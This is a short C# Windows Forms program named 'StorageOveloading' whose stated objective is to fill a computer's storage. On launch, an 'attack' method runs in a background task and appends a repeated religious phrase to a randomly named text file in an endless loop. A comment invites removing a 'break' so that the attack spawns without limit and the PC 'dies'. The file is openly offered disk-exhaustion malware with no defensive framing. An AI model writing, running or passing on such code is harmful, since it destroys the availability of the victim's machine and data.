using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace StorageOveloading
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();


            /*
             * Objectives:
             * 1. file writer (random large text)
             * 2. running in background infinite
             * 3. multi thread
             */

            while (true)
            {
                Task.Run(() => attack());

                // comment "break" if you want your pc diesssss
                break;
            }
        }

        private static Random random = new Random();

        public static string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length)
                .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        void attack()
        {
            string filename = RandomString(10) + ".txt";
            while (true)
            {
                File.AppendAllText(filename, "Dengan nama Allah, Yang Maha Pemurah, lagi Maha Mengasihani.Dengan nama Allah, Yang Maha Pemurah, lagi Maha Mengasihani.Dengan nama Allah, Yang Maha Pemurah, lagi Maha Mengasihani.Dengan nama Allah, Yang Maha Pemurah, lagi Maha Mengasihani.Dengan nama Allah, Yang Maha Pemurah, lagi Maha Mengasihani.Dengan nama Allah, Yang Maha Pemurah, lagi Maha Mengasihani.Dengan nama Allah, Yang Maha Pemurah, lagi Maha Mengasihani.Dengan nama Allah, Yang Maha Pemurah, lagi Maha Mengasihani.Dengan nama Allah, Yang Maha Pemurah, lagi Maha Mengasihani.");
            }
        }
    }
}
